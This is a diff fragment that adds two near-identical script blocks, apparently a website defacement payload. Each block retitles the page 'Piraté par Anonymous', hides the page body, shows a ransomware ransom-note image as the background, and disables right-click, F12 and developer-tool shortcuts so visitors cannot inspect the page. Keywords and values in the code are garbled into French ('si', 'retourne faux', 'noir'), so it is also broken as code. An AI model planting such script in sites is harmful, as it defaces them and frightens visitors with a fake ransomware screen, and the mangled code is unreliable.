@@ -1,0 +1,29 @@
+<script>document.title = 'Piraté par Anonymous';
+document.head.insertAdjacentHTML('beforeend', '<link rel="icône de raccourci" type="image/gif" href="https://processsafetyintegrity.com/wp-content/uploads/Media/Alert.gif">');
+document.getElementsByTagName("body")[0].style.display = "none";
+document.getElementsByTagName("html")[0].style.backgroundColor = "noir";
+document.getElementsByTagName("html")[0].style.backgroundImage = "url('https://www.bleepstatic.com/images/news/u/1220909/ransomware/encryption_page.png')";
+document.getElementsByTagName("html")[0].style.backgroundSize = "couverture";
+document.getElementsByTagName("html")[0].style.backgroundRepeat = "no-repeat";
+document.documentElement.setAttribute("oncontextmenu", "return false;");
+document.onkeydown=function(e){si(event.keyCode == 123){retourne faux;}
+si(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)){retourne faux;}
+si(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)){retourne faux;}
+si(e.ctrlKey && e.shiftKey && e.keyCode == 'C'.charCodeAt(0)){retourne faux;}
+si(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)){retourne faux;}}</script>
+
+
+
+<script>document.title = 'Piraté par Anonymous';
+document.head.insertAdjacentHTML('beforeend', '<link rel="icône de raccourci" type="image/gif" href="https://processsafetyintegrity.com/wp-content/uploads/Media/Alert.gif">');
+document.getElementsByTagName("body")[0].style.display = "none";
+document.getElementsByTagName("html")[0].style.backgroundColor = "#041375";
+document.getElementsByTagName("html")[0].style.backgroundImage = "url('https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2020/10/22094330/sl_maze_ransomware_01.png')";
+document.getElementsByTagName("html")[0].style.backgroundSize = "couverture";
+document.getElementsByTagName("html")[0].style.backgroundRepeat = "no-repeat";
+document.documentElement.setAttribute("oncontextmenu", "return false;");
+document.onkeydown=function(e){si(event.keyCode == 123){retourne faux;}
+si(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)){retourne faux;}
+si(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)){retourne faux;}
+si(e.ctrlKey && e.shiftKey && e.keyCode == 'C'.charCodeAt(0)){retourne faux;}
+si(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)){retourne faux;}}</script>
